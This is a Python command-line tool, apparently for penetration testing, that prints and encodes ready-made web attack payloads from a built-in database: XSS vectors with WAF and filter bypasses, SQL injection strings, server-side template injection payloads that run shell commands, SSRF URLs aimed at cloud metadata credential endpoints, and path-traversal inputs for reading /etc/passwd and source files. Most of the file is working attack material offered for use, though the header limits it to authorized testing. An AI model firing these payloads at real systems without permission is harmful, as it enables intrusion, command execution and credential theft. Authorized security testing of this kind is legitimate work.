#!/usr/bin/env python3
"""
Context Cannon - Smart Payload Generation

Analyzes context and filters, generates targeted payloads for security testing.
Authorized use only - for bug bounty and penetration testing with permission.

Usage:
    python cannon.py -t xss -c html              # XSS payloads for HTML context
    python cannon.py -t xss --filter "script"   # XSS bypassing 'script' filter
    python cannon.py -t sqli -c mysql            # SQLi for MySQL
"""

import sys
import json
import argparse
import re
from pathlib import Path
from urllib.parse import quote, quote_plus
import html
import base64

__version__ = "1.0.0"

# Colors
class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; C = '\033[96m'; W = '\033[97m'; E = '\033[0m'

    @classmethod
    def disable(cls):
        cls.R = cls.G = cls.Y = cls.B = cls.M = cls.C = cls.W = cls.E = ''

def banner():
    print(f"""{C.Y}
   ╔═╗╔═╗╔╗╔╔╦╗╔═╗═╗ ╦╔╦╗  ╔═╗╔═╗╔╗╔╔╗╔╔═╗╔╗╔
   ║  ║ ║║║║ ║ ║╣ ╔╩╦╝ ║   ║  ╠═╣║║║║║║║ ║║║║
   ╚═╝╚═╝╝╚╝ ╩ ╚═╝╩ ╚═ ╩   ╚═╝╩ ╩╝╚╝╝╚╝╚═╝╝╚╝
    {C.W}Smart Payload Generation{C.E}
    """)

class ContextCannon:
    def __init__(self):
        self.payloads = self.load_payloads()
        self.encoders = {
            'url': quote,
            'url_full': quote_plus,
            'html': html.escape,
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'hex': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
            'double_url': lambda x: quote(quote(x)),
        }

    def load_payloads(self):
        """Load payload databases"""
        return {
            'xss': {
                'html': [
                    '<script>alert(1)</script>',
                    '<img src=x onerror=alert(1)>',
                    '<svg onload=alert(1)>',
                    '<body onload=alert(1)>',
                    '<input onfocus=alert(1) autofocus>',
                    '<marquee onstart=alert(1)>',
                    '<details open ontoggle=alert(1)>',
                    '<video><source onerror=alert(1)>',
                ],
                'no_script': [
                    '<img src=x onerror=alert(1)>',
                    '<svg/onload=alert(1)>',
                    '<body/onload=alert(1)>',
                    '<input/onfocus=alert(1)/autofocus>',
                    '<details/open/ontoggle=alert(1)>',
                ],
                'no_parentheses': [
                    '<script>alert`1`</script>',
                    '<img src=x onerror=alert`1`>',
                    '<script>onerror=alert;throw 1</script>',
                ],
                'attribute_double': [
                    '" onmouseover="alert(1)',
                    '" onfocus="alert(1)" autofocus="',
                    '"><script>alert(1)</script>',
                    '"><img src=x onerror=alert(1)>',
                ],
                'attribute_single': [
                    "' onmouseover='alert(1)",
                    "' onfocus='alert(1)' autofocus='",
                    "'><script>alert(1)</script>",
                ],
                'javascript': [
                    "'-alert(1)-'",
                    "';alert(1)//",
                    '"-alert(1)-"',
                    '";alert(1)//',
                ],
                'waf_bypass': [
                    '<svg/onload=alert(1)>',
                    '<svg\tonload=alert(1)>',
                    '<ScRiPt>alert(1)</sCrIpT>',
                    '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
                ],
            },
            'sqli': {
                'detection': [
                    "'", "''", "' OR '1'='1", "' OR '1'='1'--",
                    '" OR "1"="1', "1' AND '1'='1", "1' AND '1'='2",
                    "1 AND 1=1", "1 AND 1=2", "' ORDER BY 1--",
                ],
                'mysql': [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT @@version--",
                    "' AND SLEEP(5)--",
                    "' AND extractvalue(1,concat(0x7e,version()))--",
                ],
                'postgres': [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT version()--",
                    "'; SELECT pg_sleep(5)--",
                ],
                'mssql': [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT @@version--",
                    "'; WAITFOR DELAY '0:0:5'--",
                ],
                'bypass': [
                    "'/**/OR/**/1=1--",
                    "' uNiOn SeLeCt NULL--",
                    "%27%20OR%201=1--",
                ],
            },
            'ssti': {
                'detection': [
                    '${7*7}', '{{7*7}}', '#{7*7}',
                    '<%= 7*7 %>', '{{config}}', '${{7*7}}',
                ],
                'jinja2': [
                    '{{config}}',
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                    '{{lipsum.__globals__["os"].popen("id").read()}}',
                ],
                'twig': [
                    '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
                ],
                'erb': [
                    '<%= system("id") %>',
                    '<%= `id` %>',
                    '<%= IO.popen("id").read %>',
                ],
                'velocity': [
                    '#set($rt=$class.forName("java.lang.Runtime").getRuntime())$rt.exec("id")',
                ],
                'freemarker': [
                    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                ],
            },
            'ssrf': {
                'localhost': [
                    'http://127.0.0.1', 'http://localhost',
                    'http://127.1', 'http://[::1]',
                    'http://2130706433', 'http://0x7f000001',
                ],
                'cloud_meta': [
                    'http://169.254.169.254/latest/meta-data/',
                    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                    'http://metadata.google.internal/computeMetadata/v1/',
                    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                    'http://100.100.100.200/latest/meta-data/',
                ],
                'bypass': [
                    'http://127.0.0.1.nip.io',
                    'http://localtest.me',
                    'http://spoofed.burpcollaborator.net',
                    'http://0177.0.0.1',
                    'http://0x7f.0x0.0x0.0x1',
                ],
            },
            'lfi': {
                'basic': [
                    '../../../etc/passwd',
                    '....//....//....//etc/passwd',
                    '..%2f..%2f..%2fetc/passwd',
                ],
                'windows': [
                    '..\\..\\..\\windows\\win.ini',
                ],
                'wrapper': [
                    'php://filter/convert.base64-encode/resource=index.php',
                    'php://input',
                ],
            },
        }

    def generate(self, vuln_type, context=None, filters=None, encode=None):
        """Generate payloads based on type, context, and filters"""
        if vuln_type not in self.payloads:
            print(f"{C.R}Unknown type: {vuln_type}{C.E}")
            return []

        payloads = self.payloads[vuln_type]
        result = []

        if context and context in payloads:
            result = payloads[context].copy()
        elif context:
            valid = ', '.join(payloads.keys())
            print(f"Warning: invalid context '{context}' for type '{vuln_type}'. "
                  f"Valid contexts: {valid}. Falling back to all contexts.",
                  file=sys.stderr)
            for val in payloads.values():
                result.extend(val)
        else:
            for val in payloads.values():
                result.extend(val)

        # Filter blocked strings
        if filters:
            filter_list = [f.strip().lower() for f in filters.split(',')]
            result = [p for p in result if not any(f in p.lower() for f in filter_list)]

        # Encode
        if encode and encode in self.encoders:
            result = [self.encoders[encode](p) for p in result]

        if not result:
            print("Warning: No payloads matched the given filters.", file=sys.stderr)

        return list(dict.fromkeys(result))

    def print_payloads(self, payloads, vuln_type, context=None):
        """Pretty print payloads"""
        banner()
        title = f"{vuln_type.upper()} Payloads"
        if context:
            title += f" ({context})"

        print(f"{C.Y}{title}{C.E}")
        print(f"{C.Y}{'─' * 50}{C.E}\n")

        for i, payload in enumerate(payloads, 1):
            print(f"{C.G}{i:3}.{C.E} {payload}")

        print(f"\n{C.C}Total: {len(payloads)} payloads{C.E}")


def main():
    parser = argparse.ArgumentParser(description='Context Cannon - Smart Payload Generation')
    parser.add_argument('-V', '--version', action='version', version=f'context-cannon {__version__}')
    parser.add_argument('-t', '--type', choices=['xss', 'sqli', 'ssti', 'ssrf', 'lfi'],
                        help='Vulnerability type')
    parser.add_argument('-c', '--context', help='Specific context')
    parser.add_argument('--filter', help='Blocked strings to avoid (comma-separated)')
    parser.add_argument('-e', '--encode', choices=['url', 'url_full', 'html', 'base64', 'hex', 'double_url'])
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('--list', action='store_true', help='List available contexts')
    parser.add_argument('--no-color', action='store_true', help='Disable colored output')
    parser.add_argument('--json', action='store_true', help='Output as JSON')
    parser.add_argument('-q', '--quiet', action='store_true', help='Suppress banner, print payloads only')

    args = parser.parse_args()

    if args.no_color:
        C.disable()

    cannon = ContextCannon()

    if args.list:
        if not args.quiet:
            banner()
        print(f"{C.Y}Available Contexts:{C.E}\n")
        for vtype, contexts in cannon.payloads.items():
            print(f"{C.G}{vtype}:{C.E} {', '.join(contexts.keys())}")
        return

    if args.type:
        payloads = cannon.generate(args.type, args.context, args.filter, args.encode)

        if args.json:
            output = {
                'type': args.type,
                'context': args.context,
                'count': len(payloads),
                'payloads': payloads,
            }
            if args.filter:
                output['filter'] = args.filter
            if args.encode:
                output['encoding'] = args.encode
            print(json.dumps(output, indent=2))
        elif args.quiet:
            for p in payloads:
                print(p)
        else:
            cannon.print_payloads(payloads, args.type, args.context)

        if args.output:
            try:
                Path(args.output).write_text('\n'.join(payloads))
                if not args.quiet and not args.json:
                    print(f"\n{C.G}Saved to: {args.output}{C.E}")
            except (OSError, PermissionError) as e:
                print(f"Error: Could not write to '{args.output}': {e}", file=sys.stderr)
                sys.exit(1)
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
